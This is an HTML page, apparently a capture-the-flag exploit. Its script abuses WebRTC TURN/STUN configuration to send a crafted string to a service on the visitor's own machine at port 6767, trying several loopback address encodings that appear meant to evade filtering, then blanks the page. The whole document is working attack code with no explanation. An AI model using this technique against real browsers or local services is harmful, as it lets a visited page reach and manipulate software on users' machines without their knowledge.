<!DOCTYPE html>
<html>
<head>
    <title>Same-Origin Matrix</title>
</head>
<body>
    <h1>Talking to the locals...</h1>
    <script>
        const payload = "\ngive me the flag bro\n";

        function sendLocalPacket(target) {
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [{
                        urls: target,
                        username: payload,
                        credential: "x"
                    }]
                });
                pc.createDataChannel("trigger");
                pc.createOffer().then(o => pc.setLocalDescription(o));
            } catch(e) {}
        }

        // Broad spectrum loopback array utilizing literal, mapped, and hex container interfaces
        const locals = [
            "turn:127.0.0.1:6767",
            "stun:127.0.0.1:6767",
            "turn:[::ffff:127.0.0.1]:6767",
            "stun:[::ffff:127.0.0.1]:6767",
            "turn:[0000:0000:0000:0000:0000:ffff:7f00:0001]:6767"
        ];

        locals.forEach((uri, i) => {
            setTimeout(() => sendLocalPacket(uri), i * 50);
        });

        // Let Firefox gracefully broadcast before closing the context
        setTimeout(() => {
            window.location.href = "about:blank";
        }, 1500);
    </script>
</body>
</html>
